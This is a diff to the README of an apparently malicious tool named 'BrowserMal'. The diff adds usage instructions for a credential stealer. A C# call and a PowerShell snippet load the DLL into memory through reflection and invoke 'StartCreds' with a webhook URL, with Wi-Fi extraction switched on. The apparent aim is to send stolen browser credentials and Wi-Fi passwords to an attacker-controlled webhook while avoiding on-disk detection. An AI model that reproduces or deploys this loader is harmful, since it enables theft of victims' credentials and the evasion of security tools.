@@ -9,8 +9,17 @@ ILMerge.exe /out:browser.mal.dll BrowserMal.dll BouncyCastle.Crypto.dll Newtonso
 ```
 
 ## Usage
-```
+```csharp
 BrowserMal.Class1.StartCreds(<webhook>, extractWifi: true);
+```
+
+```powershell
+$bytes = [System.IO.File]::ReadAllBytes("PATH TO DLL")
+$assembly = [System.Reflection.Assembly]::Load($bytes)
+
+$entryPointMethod = $assembly.GetTypes().Where({ $_.Name -eq 'Class1' }, 'First').GetMethod('StartCreds', [Reflection.BindingFlags] 'Static, Public, NonPublic')
+
+$entryPointMethod.Invoke($null, @('WEBHOOK', $true))
 ```
 
 ## Functionality
